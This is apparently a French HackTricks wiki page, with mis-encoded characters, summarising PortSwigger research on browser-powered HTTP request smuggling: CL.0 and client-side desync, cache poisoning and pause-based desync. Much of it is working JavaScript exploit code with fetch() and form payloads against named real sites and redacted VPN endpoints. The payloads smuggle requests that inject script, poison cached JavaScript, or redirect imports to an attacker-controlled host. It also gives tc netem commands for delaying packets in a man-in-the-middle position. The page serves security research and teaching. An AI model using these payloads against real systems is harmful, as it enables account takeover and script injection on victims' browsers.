# Browser HTTP Request Smuggling

<details>

<summary><strong>Apprenez le piratage AWS de zÃ©ro Ã  hÃ©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncÃ©e dans HackTricks** ou **tÃ©lÃ©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* DÃ©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** ğŸ’¬ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-nous sur **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dÃ©pÃ´ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
## CL.0/H2.0 dÃ©synchronisation compatible avec le navigateur

Cette vulnÃ©rabilitÃ© se produit lorsque l'en-tÃªte **Content Length** (CL) est complÃ¨tement **ignorÃ©** par le **serveur backend**. Ensuite, le backend traite le **corps** comme le **dÃ©but de la mÃ©thode de la deuxiÃ¨me requÃªte**. Ignorer le CL Ã©quivaut Ã  le traiter comme ayant une valeur de 0, donc c'est une dÃ©synchronisation CL.0 - une classe d'attaque [connue](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf) mais moins explorÃ©e.

![](<../../.gitbook/assets/image (3) (1) (2).png>)

L'attaque Ã©tait possible parce que le serveur backend **ne s'attendait tout simplement pas Ã  une requÃªte POST**.

{% hint style="warning" %}
Notez que cette vulnÃ©rabilitÃ© est **dÃ©clenchÃ©e** par une **requÃªte HTTP valide**, conforme aux spÃ©cifications. Cela signifiait que le **front-end n'a aucune chance de se protÃ©ger** contre elle, et elle pourrait mÃªme Ãªtre dÃ©clenchÃ©e par un navigateur.
{% endhint %}

La seule **diffÃ©rence** entre **CL.0** et **H2.0** est que le second utilise **HTTP2** (qui a un en-tÃªte de longueur de contenu implicite) mais le **backend n'utilise pas non plus cela**.

## DÃ©synchronisation cÃ´tÃ© client

Les attaques de dÃ©synchronisation traditionnelles **empoisonnent** la **connexion** entre un serveur **front-end et backend**, et sont donc impossibles sur les sites Web qui n'utilisent pas une architecture front-end/backend. Ce sont dÃ©sormais des **dÃ©synchronisations cÃ´tÃ© serveur**. La plupart des **dÃ©synchronisations cÃ´tÃ© serveur** ne peuvent Ãªtre dÃ©clenchÃ©es que par un **client HTTP personnalisÃ© Ã©mettant une requÃªte malformÃ©e**.

La capacitÃ© d'un **navigateur Ã  provoquer une dÃ©synchronisation** permet une toute nouvelle classe de menace appelÃ©e **dÃ©synchronisation cÃ´tÃ© client** (CSD).\
Une attaque CSD commence lorsque la **victime visite le site Web de l'attaquant**, qui fait ensuite envoyer par son navigateur **deux requÃªtes cross-domain au site vulnÃ©rable**. La **premiÃ¨re** requÃªte est conÃ§ue pour **dÃ©synchroniser la connexion du navigateur** et faire en sorte que la **deuxiÃ¨me requÃªte dÃ©clenche** une rÃ©ponse nuisible, donnant gÃ©nÃ©ralement Ã  l'attaquant le contrÃ´le du compte de la victime.

### DÃ©tecter

Un vecteur CSD est une requÃªte HTTP avec **deux propriÃ©tÃ©s clÃ©s**.

PremiÃ¨rement, le **serveur doit ignorer le Content-Length (CL) de la requÃªte**. Cela se produit gÃ©nÃ©ralement parce que la requÃªte a soit **dÃ©clenchÃ© une erreur serveur**, soit le serveur **ne s'attendait tout simplement pas Ã  une requÃªte POST** vers l'endpoint choisi. Essayez de cibler les **fichiers statiques** et les **redirections au niveau du serveur**, et de dÃ©clencher des erreurs via des **URLs trop longues**, et des **semi-malformÃ©es** comme /%2e%2e.

DeuxiÃ¨mement, la requÃªte doit pouvoir Ãªtre **dÃ©clenchÃ©e dans un navigateur web cross-domain**. Les navigateurs restreignent sÃ©vÃ¨rement le contrÃ´le des requÃªtes cross-domain, donc vous avez un contrÃ´le limitÃ© sur les en-tÃªtes, et si votre requÃªte a un corps, vous devrez utiliser la mÃ©thode HTTP POST. En fin de compte, vous ne **contrÃ´lez** que l'**URL**, plus quelques bricoles comme l'en-tÃªte **Referer**, le **corps**, et la **partie finale du Content-Type.**

#### Tests d'ignorance de CL

La faÃ§on de tester cette mauvaise configuration est d'**envoyer 2 requÃªtes et d'en dissimuler une** au **milieu**. Si la connexion **dissimulÃ©e** a **affectÃ©** la rÃ©ponse de la **deuxiÃ¨me requÃªte**, cela signifie qu'elle est **vulnÃ©rable** :

![](<../../.gitbook/assets/image (1) (2) (2) (1).png>)

{% hint style="warning" %}
Notez que vous **ne pouvez pas** tester cette vuln en envoyant simplement un **Content-Length plus grand** que celui envoyÃ© et **en cherchant un dÃ©lai d'attente** car certains serveurs **rÃ©pondent** mÃªme s'ils **n'ont pas reÃ§u l'intÃ©gralitÃ© du corps**.
{% endhint %}

Il est important de noter si le **site cible prend en charge HTTP**/2. Les attaques CSD exploitent gÃ©nÃ©ralement la rÃ©utilisation de la connexion HTTP/1.1 et les **navigateurs web prÃ©fÃ¨rent utiliser HTTP/2** chaque fois que possible, donc si le site cible **prend en charge HTTP/2, vos attaques sont peu susceptibles de fonctionner**. Il y a une **exception** ; certains **proxies avancÃ©s ne prennent pas en charge HTTP/2** donc vous pouvez exploiter n'importe qui les utilisant. Cela inclut les proxies d'entreprise, certains VPN intrusifs et mÃªme certains outils de sÃ©curitÃ©.

### Confirmer

Tout d'abord, sÃ©lectionnez un site Ã  partir duquel lancer l'attaque. Ce site doit Ãªtre **accessible via HTTPS** et situÃ© sur un **domaine diffÃ©rent de la cible**.

Ensuite, assurez-vous de **ne pas avoir de proxy configurÃ©**, puis naviguez vers votre site d'attaque. Ouvrez les **outils de dÃ©veloppement** et passez Ã  l'onglet **RÃ©seau**. Pour aider au dÃ©bogage de problÃ¨mes potentiels plus tard, je recommande de faire les ajustements suivants :

* Cochez la case **"Preserve log"**.
* Faites un clic droit sur les en-tÃªtes de colonne et **activez la colonne "Connection ID"**.

Passez Ã  la console de dÃ©veloppement et exÃ©cutez du JavaScript pour rÃ©pliquer votre sÃ©quence d'attaque en utilisant fetch(). Cela peut ressembler Ã  quelque chose comme :
```javascript
fetch('https://example.com/', {
method: 'POST',
body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix
mode: 'no-cors', // ensure connection ID is visible
credentials: 'include' // poison 'with-cookies' pool
}).then(() => {
location = 'https://example.com/' // use the poisoned connection
})
```
```markdown
J'ai dÃ©fini le mode fetch **'no-cors'** pour garantir que Chrome **affiche l'ID de connexion** dans l'onglet RÃ©seau. J'ai Ã©galement dÃ©fini **credentials: 'include'** car Chrome a [**deux pools de connexions distincts**](https://www.chromium.org/developers/design-documents/network-stack/preconnect) - un pour les requÃªtes avec cookies et un pour celles sans cookies. Vous voudrez gÃ©nÃ©ralement exploiter les **navigations**, et celles-ci **utilisent le pool 'avec-cookies'**, donc il vaut mieux prendre l'habitude de toujours empoisonner ce pool.

Lorsque vous exÃ©cutez ceci, vous devriez voir **deux requÃªtes** dans l'onglet RÃ©seau avec le **mÃªme ID de connexion**, et la **seconde** devrait dÃ©clencher un **404** :

![](<../../.gitbook/assets/image (158) (2).png>)

Si cela fonctionne comme prÃ©vu, fÃ©licitations - vous avez trouvÃ© un desync cÃ´tÃ© client !

### Exploitation - Stockage

Une option consiste Ã  identifier une fonctionnalitÃ© sur le site cible qui vous permet de **stocker des donnÃ©es textuelles**, et de concevoir le prÃ©fixe de sorte que les cookies de votre victime, les en-tÃªtes d'authentification ou le mot de passe finissent par Ãªtre **stockÃ©s quelque part oÃ¹ vous pouvez les rÃ©cupÃ©rer**. Ce flux d'attaque fonctionne [presque identiquement Ã  l'exploitation de l'empaquetage de requÃªtes cÃ´tÃ© serveur](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests), donc je ne m'attarderai pas dessus.

### Exploitation - **ChaÃ®nage & pivot**

Dans des circonstances normales, de nombreuses classes d'**attaques cÃ´tÃ© serveur** ne peuvent Ãªtre lancÃ©es que par un attaquant ayant un accÃ¨s direct au site cible car elles **reposent sur des requÃªtes HTTP que les navigateurs refusent d'envoyer**, comme la **manipulation** des **en-tÃªtes HTTP** - empoisonnement du cache web, la plupart des empaquetages de requÃªtes cÃ´tÃ© serveur, attaques basÃ©es sur l'en-tÃªte Host, injections SQL basÃ©es sur l'User-Agent, CSRF avec type de contenu JSON et de nombreuses autres.

Le chemin le plus simple vers une attaque rÃ©ussie venait de deux techniques clÃ©s habituellement utilisÃ©es pour les attaques de desync cÃ´tÃ© serveur : [**empoisonnement de ressource JavaScript via des redirections d'en-tÃªte Host**](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect), et l'utilisation de la mÃ©thode [**HEAD**](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head) pour assembler une rÃ©ponse avec du HTML nuisible. Les deux techniques devaient Ãªtre **adaptÃ©es** pour surmonter certains dÃ©fis inÃ©dits associÃ©s Ã  l'opÃ©ration dans le **navigateur de la victime**.

## Exemples d'exploitation

### Exemple de HEAD empilÃ©

* **Exploit colorÃ©**

![](<../../.gitbook/assets/image (2) (3).png>)

* **Exploit JS**
```
```javascript
fetch('https://www.capitalone.ca/assets', {
method: 'POST',
// use a cache-buster to delay the response
body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
credentials: 'include',
mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
location = 'https://www.capitalone.ca/'
})va
```
Explication :

* **Abus de CL.0** dans /assets (il redirige vers /assets/ et ne vÃ©rifie pas le CL)
* **Smuggle** une requÃªte **HEAD** (car les rÃ©ponses HEAD contiennent toujours un content-length)
* **Smuggle** une requÃªte **GET** dont le **contenu** va Ãªtre **reflÃ©tÃ©** dans la rÃ©ponse avec le payload.
* Ã€ cause du **content-length de la requÃªte HEAD**, la **rÃ©ponse** Ã  cette requÃªte sera le **corps de la requÃªte HEAD**
* DÃ©finir le **mode cors**. Normalement, cela n'est pas fait, mais dans ce cas, la **rÃ©ponse** du serveur Ã  la **POST initiale** est une **redirection** qui, si **suivie**, rendrait l'**exploit inopÃ©rant**. Par consÃ©quent, le **mode cors** est utilisÃ© pour **dÃ©clencher** une **erreur** et **rediriger** la victime avec le **`catch`**.

### **Redirection de l'en-tÃªte Host + empoisonnement du cache cÃ´tÃ© client**

* **Exploit JS**
```javascript
fetch('https://redacted/', {
method: 'POST',
body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
credentials: 'include'}
).catch(() => { location='https://redacted/+CSCOE+/win.js' })
```
* Une requÃªte vers `/+webvpn+/` avec un **domaine diffÃ©rent dans l'en-tÃªte Host** reÃ§oit une **redirection** vers `/+webvpn+/index.html` vers ce **domaine** indiquÃ© dans l'en-tÃªte Host.
* L'emplacement dans la **deuxiÃ¨me** requÃªte est dÃ©fini sur `/+CSCOE+/win.js` afin de **polluer** le **cache** de ce fichier `.js`.
* Cette requÃªte recevra la redirection de `/+webvpn+/` vers le domaine de l'attaquant avec le chemin `/+webvpn+/index.html`
* Le **cache** de **`win.js`** sera **polluÃ©** avec une **redirection** vers la page de l'**attaquant**, mais aussi la **victime** **suivra** la redirection comme elle a Ã©tÃ© assignÃ©e dans la variable `location` et finira sur la page web de l'attaquant.
* L'attaquant redirigera ensuite la **victime** vers `https://redacted/+CSCOE+/logon.html`. Cette page importera `/+CSCOE+/win.js`. Dont le **cache est une redirection** vers le serveur de l'**attaquant**, par consÃ©quent, l'attaquant peut **rÃ©pondre avec un JS malveillant**.

La **victime** **accÃ©dera** Ã  la page de l'**attaquant** **deux fois**, la premiÃ¨re elle **s'attend Ã  un HTML** qui redirige la victime vers `https://redacted/+CSCOE+/logon.html` et la seconde elle **s'attend Ã  du code javascript** (le payload). Un polyglotte peut Ãªtre utilisÃ© pour servir les deux rÃ©ponses en une seule :
```
HTTP/1.1 200 OK
Content-Type: text/html

alert('oh dear')/*<script>location = 'https://redacted/+CSCOE+/logon.html'</script>*/
```
### Charge utile HEAD avec TE fragmentÃ©

Lors de la recherche de CSD, vous pouvez Ã©galement **tester des URL semi-malformÃ©es** comme `/..%2f` ou `/%2f`.

* **Exploit ColorÃ©**

![](<../../.gitbook/assets/image (5) (2) (1).png>)

* **Exploit JS**
```javascript
fetch('https://www.verisign.com/%2f', {
method: 'POST',
body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1\r\nHost: www.verisign.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n34d\r\nx`,
credentials: 'include',
headers: {'Content-Type': 'application/x-www-form-urlencoded'
}}).catch(() => {
let form = document.createElement('form')
form.method = 'POST'
form.action = 'https://www.verisign.com/robots.txt'
form.enctype = 'text/plain'
let input = document.createElement('input')
input.name = '0\r\n\r\nGET /<svg/onload=alert(1)> HTTP/1.1\r\nHost: www.verisign.com\r\n\r\nGET /?aaaaaaaaaaaaaaa HTTP/1.1\r\nHost: www.verisign.com\r\n\r\n'
input.value = ''
form.appendChild(input)
document.body.appendChild(form)
form.submit()
}
```
* La page **`/%2f`** est accÃ©dÃ©e pour **exploiter** la vulnÃ©rabilitÃ© **CL.0**.
* Une requÃªte **HEAD** est introduite clandestinement en utilisant un **`Transfer-Encoding: chunked` header**.
* Cet en-tÃªte est nÃ©cessaire dans ce scÃ©nario car sinon **le serveur refusait d'accepter une requÃªte HEAD avec un corps**.
* Ensuite, l'utilisateur envoie un POST dont le corps contient **la fin du chunk de la prÃ©cÃ©dente requÃªte HEAD** et une **nouvelle requÃªte qui est introduite clandestinement** avec du **contenu** (le payload JS) qui sera **reflÃ©tÃ©** dans la rÃ©ponse.
* Par consÃ©quent, le navigateur traitera la **rÃ©ponse Ã  la requÃªte HEAD** comme la **rÃ©ponse Ã  la requÃªte POST** qui **contiendra** Ã©galement dans la **rÃ©ponse du corps** ce qui **reflÃ¨te** l'**entrÃ©e** de l'utilisateur dans la seconde requÃªte introduite clandestinement.

### Redirection de l'en-tÃªte Host + RC

* **Exploit JS**
```html
<script>
function reset() {
fetch('https://vpn.redacted/robots.txt',
{mode: 'no-cors', credentials: 'include'}
).then(() => {
x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
})
setTimeout(poison, 120) // worked on 140. went down to 110
}

function poison(){
sendPoison()
sendPoison()
sendPoison()
setTimeout(reset, 1000)
}

function sendPoison(){
fetch('https://vpn.redacted/dana-na/css/ds_1234cb049586a32ce264fd67d524d7271e4affc0e377d7aede9db4be17f57fc1.css',
{
method: 'POST',
body: "GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: '+'a'.repeat(9826)+'\r\nConnection: keep-alive\r\n\r\n",
mode: 'no-cors',
credentials: 'include'
}
)
}

</script>
<a onclick="x = window.open('about:blank'); reset()">Start attack</a>
```
Dans ce cas, il y a encore une **redirection d'en-tÃªte d'hÃ´te** qui pourrait Ãªtre utilisÃ©e pour **dÃ©tourner** une importation de **JS**. Cependant, cette fois, la **redirection n'est pas mise en cache**, donc l'empoisonnement du **cache** cÃ´tÃ© client n'est pas une option.

Par consÃ©quent, l'attaque effectuÃ©e fera en sorte que la **victime accÃ¨de Ã  la page vulnÃ©rable** dans un onglet et ensuite, juste **avant** que la page essaie de **charger un fichier JS**, **empoisonne** les connexions de **smuggling** (3 dans ce cas).\
Comme le **timing** doit Ãªtre extrÃªmement **prÃ©cis**, l'attaque est rÃ©alisÃ©e contre un **nouvel onglet Ã  chaque itÃ©ration** jusqu'Ã  ce qu'elle fonctionne.

{% hint style="warning" %}
Gardez Ã  l'esprit que dans ce cas, `/meeting_testjs.cgi` a Ã©tÃ© attaquÃ© parce qu'il **charge** un **Javascript** qui rÃ©pond avec un **404**, donc il n'est pas mis en cache. Dans d'autres scÃ©narios oÃ¹ vous essayez d'attaquer un **JS qui est mis en cache**, vous devez attendre qu'il **disparaisse du cache** avant de lancer une nouvelle attaque.
{% endhint %}

Ã‰tapes rÃ©sumÃ©es :

* Ouvrir une nouvelle fenÃªtre.
* Ã‰mettre une requÃªte inoffensive vers la cible pour Ã©tablir une nouvelle connexion, rendant les timings plus cohÃ©rents.
* Naviguer dans la fenÃªtre vers la page cible Ã  /meeting_testjs.cgi.
* 120 ms plus tard, crÃ©er trois connexions empoisonnÃ©es en utilisant le gadget de redirection.
* 5 ms plus tard, pendant le rendu de /meeting_testjs.cgi, la victime tentera, espÃ©rons-le, d'importer /appletRedirect.js et sera redirigÃ©e vers x.psres.net, qui fournit un JS malveillant.
* Si ce n'est pas le cas, rÃ©essayer l'attaque.

## DÃ©synchronisation basÃ©e sur la pause <a href="#pause" id="pause"></a>

La pause peut Ã©galement crÃ©er de nouvelles vulnÃ©rabilitÃ©s de dÃ©synchronisation en **dÃ©clenchant des implÃ©mentations erronÃ©es de dÃ©lai d'attente de requÃªte**.

Ainsi, un attaquant pourrait envoyer une requÃªte avec des **en-tÃªtes indiquant qu'il y a un corps**, puis **attendre** que le **front-end expire avant d'envoyer le corps**. Si le front-end expire mais **laisse la connexion ouverte**, le **corps** de cette requÃªte sera **traitÃ© comme une nouvelle requÃªte**.

### Exemple : **Varnish**

Varnish cache possÃ¨de une fonctionnalitÃ© appelÃ©e `synth()`, qui vous permet d'Ã©mettre une **rÃ©ponse sans transmettre** la requÃªte au back-end. Voici un exemple de rÃ¨gle utilisÃ©e pour bloquer l'accÃ¨s Ã  un dossier :
```javascript
if (req.url ~ "^/admin") {
return (synth(403, "Forbidden"));
}
```
Lors du traitement d'une **requÃªte partielle** qui correspond Ã  une rÃ¨gle synthÃ©tique, Varnish **expirera** s'il ne reÃ§oit aucune donnÃ©e pendant **15 secondes**. Lorsque cela se produit, il **laisse la connexion ouverte** pour rÃ©utilisation bien qu'il n'ait lu que la moitiÃ© de la requÃªte sur le socket. Cela signifie que si le **client envoie la seconde moitiÃ©** de la requÃªte HTTP, elle sera interprÃ©tÃ©e comme une **nouvelle requÃªte**.

Pour dÃ©clencher une dÃ©synchronisation basÃ©e sur une pause sur un front-end vulnÃ©rable, commencez par envoyer vos en-tÃªtes, promettant un corps, puis attendez simplement. Finalement, vous recevrez une rÃ©ponse et lorsque vous enverrez finalement le corps de votre requÃªte, il sera interprÃ©tÃ© comme une nouvelle requÃªte :

![](<../../.gitbook/assets/image (4) (3) (1).png>)

{% hint style="warning" %}
Apparemment, cela a Ã©tÃ© corrigÃ© le 25 janvier comme [CVE-2022-23959](https://varnish-cache.org/security/VSV00008.html).
{% endhint %}

### Exemple : **Apache**

Tout comme Varnish, il est vulnÃ©rable sur **les points de terminaison oÃ¹ le serveur gÃ©nÃ¨re la rÃ©ponse lui-mÃªme** plutÃ´t que de laisser l'application gÃ©rer la requÃªte. Cela se produit, par exemple, avec les redirections au niveau du serveur : `Redirect 301 / /en`

### Exploitation cÃ´tÃ© serveur <a href="#server" id="server"></a>

Si le serveur vulnÃ©rable (Apache ou Varnish dans ce cas) est en back-end, un **front-end** qui **transmet la requÃªte au serveur back-end** (les en-tÃªtes http dans ce cas) **sans mettre en mÃ©moire tampon** l'intÃ©gralitÃ© du corps de la requÃªte est nÃ©cessaire.

![](<../../.gitbook/assets/image (3) (3).png>)

Dans ce cas, l'attaquant **ne recevra pas le dÃ©lai d'expiration de la rÃ©ponse avant d'avoir envoyÃ© le corps**. Mais s'il connaÃ®t le dÃ©lai, cela ne devrait pas poser de problÃ¨me.

L'Application Load Balancer (ALB) d'Amazon **transmettra les donnÃ©es de la connexion selon les besoins**, mais s'il **reÃ§oit** la **rÃ©ponse** Ã  la demi-requÃªte (le dÃ©lai d'expiration) **avant** de recevoir le **corps**, il **n'enverra pas le corps**, donc une **Condition de Course** doit Ãªtre exploitÃ©e ici :

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Il y a une complication supplÃ©mentaire lorsqu'il s'agit d'**exploiter Apache derriÃ¨re ALB** - **les deux serveurs** ont un dÃ©lai d'expiration par dÃ©faut de **60 secondes**. Cela laisse une **fenÃªtre de temps extrÃªmement rÃ©duite** pour envoyer la seconde partie de la requÃªte. L'attaque RC a finalement Ã©tÃ© couronnÃ©e de succÃ¨s aprÃ¨s 66 heures.

### Exploitation MITM

Il semble **impossible d'arrÃªter une requÃªte depuis le navigateur** afin d'exploiter une vulnÃ©rabilitÃ© de dÃ©synchronisation Pause. Cependant, vous pourriez toujours **effectuer une attaque MITM pour mettre en pause une requÃªte** envoyÃ©e par le navigateur. Notez que cette attaque **ne repose pas sur le dÃ©cryptage** du trafic.

Le dÃ©roulement de l'attaque est trÃ¨s **similaire Ã  une attaque de dÃ©synchronisation cÃ´tÃ© client classique**. L'utilisateur visite une page contrÃ´lÃ©e par l'attaquant, qui Ã©met une sÃ©rie de **requÃªtes cross-domain** vers l'application cible. La **premiÃ¨re requÃªte HTTP** est dÃ©libÃ©rÃ©ment allongÃ©e pour Ãªtre si **grande** que le systÃ¨me d'exploitation **la divise en plusieurs paquets TCP**, permettant Ã  un **MITM actif de retarder le dernier paquet**, dÃ©clenchant une dÃ©synchronisation basÃ©e sur une pause. GrÃ¢ce au remplissage, l'**attaquant** peut **identifier** quel **paquet mettre en pause** simplement en se basant sur la **taille**.

Du cÃ´tÃ© client, cela ressemble Ã  une dÃ©synchronisation cÃ´tÃ© client rÃ©guliÃ¨re utilisant le gadget HEAD, Ã  part le remplissage de la requÃªte :
```javascript
let form = document.createElement('form')
form.method = 'POST'
form.enctype = 'text/plain'
form.action = 'https://x.psres.net:6082/redirect?'+"h".repeat(600)+ Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script> HTTP/1.1\r\nHost: x\r\nFoo: bar"+"\r\n\r\n".repeat(1700)+"x"
input.value = "x"
form.append(input)
document.body.appendChild(form)
form.submit()
```
Sur le systÃ¨me de l'attaquant effectuant le MITM aveugle, le dÃ©lai a Ã©tÃ© implÃ©mentÃ© en utilisant tc-NetEm :
```bash
# Setup
tc qdisc add dev eth0 root handle 1: prio priomap

# Flag packets to 34.255.5.242 that are between 700 and 1300 bytes
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
and 'cmp(u16 at 2 layer network gt 0x02bc)' \
and 'cmp(u16 at 2 layer network lt 0x0514)' \
flowid 1:3

# Delay flagged packets by 61 seconds
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
```
## **RÃ©fÃ©rences**

* Toutes les informations de ce post ont Ã©tÃ© prises de [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)

<details>

<summary><strong>Apprenez le hacking AWS de zÃ©ro Ã  hÃ©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncÃ©e dans HackTricks** ou **tÃ©lÃ©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* DÃ©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** ğŸ’¬ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-nous sur **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dÃ©pÃ´ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
